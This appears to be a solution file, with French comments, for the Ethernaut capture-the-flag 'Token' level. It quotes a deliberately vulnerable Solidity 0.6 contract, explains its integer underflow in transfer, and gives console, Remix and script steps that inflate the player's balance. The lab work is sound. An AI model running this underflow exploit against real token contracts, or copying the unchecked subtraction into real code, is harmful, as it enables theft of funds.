// Level 6: Token - Solution
// L'objectif est d'exploiter une vulnérabilité d'underflow dans la fonction transfer

// Code du contrat vulnérable
const tokenContractCode = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
`;

// Explication de la vulnérabilité
/*
La vulnérabilité se trouve dans la fonction transfer, plus précisément dans la ligne:
require(balances[msg.sender] - _value >= 0);

En Solidity 0.6.0, les opérations arithmétiques ne déclenchent pas d'erreur en cas 
d'underflow/overflow (contrairement à Solidity 0.8.0+). Avec un uint256, le résultat 
d'une soustraction sera toujours >= 0 même en cas d'underflow, car le résultat "boucle".

Par exemple, si on a 20 tokens et qu'on essaie d'en transférer 21:
1. La vérification `require(20 - 21 >= 0)` passe car 20 - 21 avec un uint256 donne
   un très grand nombre (2^256 - 1) au lieu de -1
2. `balances[msg.sender] -= _value` fait aussi un underflow, donnant 2^256 - 1 tokens
3. Notre solde est maintenant immense
*/

// Étapes d'exploitation (via console Ethernaut)
/*
1. Vérifier notre solde initial (généralement 20 tokens):
   let myBalance = await contract.balanceOf(player);
   console.log("Solde initial:", myBalance.toString());

2. Exploiter l'underflow en transférant plus que notre solde:
   await contract.transfer("0x0000000000000000000000000000000000000000", 21);
   
   Note: L'adresse de destination "_to" peut être n'importe quelle adresse valide,
   car c'est sur notre propre solde que l'underflow se produit.

3. Vérifier notre nouveau solde:
   let newBalance = await contract.balanceOf(player);
   console.log("Nouveau solde:", newBalance.toString());
   
   Le solde devrait être un nombre immense (proche de 2^256-1)
*/

// Alternative: Exploitation via Remix
/*
1. Compiler le contrat avec Solidity 0.6.x
2. Utiliser "At Address" pour charger l'instance existante (NE PAS déployer un nouveau contrat)
3. Appeler la fonction balanceOf avec notre adresse pour vérifier le solde initial
4. Appeler transfer avec:
   - _to: Une adresse valide (le contrat lui-même, notre adresse, etc.)
   - _value: 21 (ou solde_initial + 1)
   - Value (ETH à envoyer): 0 wei (important!)
5. Vérifier à nouveau le solde avec balanceOf
*/

// Commandes de vérification
(async () => {
  const initialBalance = await contract.balanceOf(player);
  console.log("Solde initial:", initialBalance.toString());
  
  // Effectuer l'attaque
  console.log("Exécution de l'attaque...");
  await contract.transfer("0x0000000000000000000000000000000000000000", initialBalance.add(1));
  
  // Vérifier le résultat
  const finalBalance = await contract.balanceOf(player);
  console.log("Solde final:", finalBalance.toString());
  console.log("Attaque réussie?:", finalBalance.gt(initialBalance));
})(); 